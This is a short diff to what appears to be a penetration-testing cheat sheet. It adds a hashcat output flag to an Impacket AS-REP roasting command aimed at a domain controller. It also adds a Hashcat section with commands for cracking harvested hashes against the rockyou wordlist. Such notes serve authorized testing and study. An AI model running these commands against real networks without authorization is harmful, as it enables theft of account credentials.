@@ -607,7 +607,7 @@ upload {FILE.exe}
 ```bash
 
 # ASREP ROAST
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip {IP ADDRESS} -request '{DC.NAME}/'
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip {IP ADDRESS} -request '{DC.NAME}/' -format hashcat
 
 
 ```
@@ -1181,6 +1181,21 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 # Password Cracking
 
 ***
+
+#### Hashcat
+
+<br />
+
+```bash
+
+# Search hash numbers
+hashcat --example-hashes | less
+/hash
+
+# Crack Hash
+hashcat -m {HASH NUMBER} {HASH} /usr/share/wordlists/rockyou.txt -O --force
+
+```
 
 #### John The Ripper
 
